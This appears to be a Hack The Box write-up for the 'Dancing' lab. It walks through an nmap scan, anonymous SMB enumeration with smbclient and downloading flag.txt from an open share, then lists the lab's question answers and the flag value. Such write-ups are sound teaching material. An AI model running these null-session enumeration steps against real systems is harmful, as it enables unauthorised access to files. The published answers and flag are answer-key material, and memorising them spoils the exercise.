---
layout: default
title: Dancing
parent: Very Easy
grand_parent: Hack The Box
nav_order: 3
---

# Dancing
#Protocols #SMB #Reconnaissance #Anonymous/GuestAccess 

## Nmap Scan

```bash
❯ nmap 10.129.1.12
Nmap scan report for 10.129.1.12
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Samba is open, I'll use `smbclient` to enumerate it with a null session.

```bash
❯ smbclient -N -L 10.129.1.12 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

```bash
❯ smbclient -N //10.129.1.12/WorkShares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Mar 29 02:22:01 2021
  ..                                  D        0  Mon Mar 29 02:22:01 2021
  Amy.J                               D        0  Mon Mar 29 03:08:24 2021
  James.P                             D        0  Thu Jun  3 03:38:03 2021

		5114111 blocks of size 4096. 1732824 blocks available
smb: \>
```

The flag is in James directory. 

```
smb: \> dir Amy.J/*
  .                                   D        0  Mon Mar 29 03:08:24 2021
  ..                                  D        0  Mon Mar 29 03:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 05:00:37 2021

		5114111 blocks of size 4096. 1732824 blocks available
smb: \> dir James.P/*
  .                                   D        0  Thu Jun  3 03:38:03 2021
  ..                                  D        0  Thu Jun  3 03:38:03 2021
  flag.txt                            A       32  Mon Mar 29 03:26:57 2021

		5114111 blocks of size 4096. 1732824 blocks available
smb: \>
```

Let's get it.

```
smb: \> cd James.P
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec)
smb: \James.P\> exit

❯ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

Thanks for reading! Now, let's answer the questions.

> -   **What does the 3-letter acronym SMB stand for?**
> 
> -   Server Message Block

  

> -   **What port does SMB use to operate at?**
> 
> -   445

  

> -   **What is the service name for port 445 that came up in our Nmap scan?**
> 
> -   microsoft-ds

  

> -   **What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?**
> 
> -   -L

  

> -   **How many shares are there on Dancing?**
> 
> -   4

  

> -   **What is the name of the share we are able to access in the end with a blank password?**
> 
> -   WorkShares

  

> -   **What is the command we can use within the SMB shell to download the files we find?**
> 
> -   get

  

> -   **Submit root flag**
> 
> -   5f61c10dffbc77a704d76016a22f1664

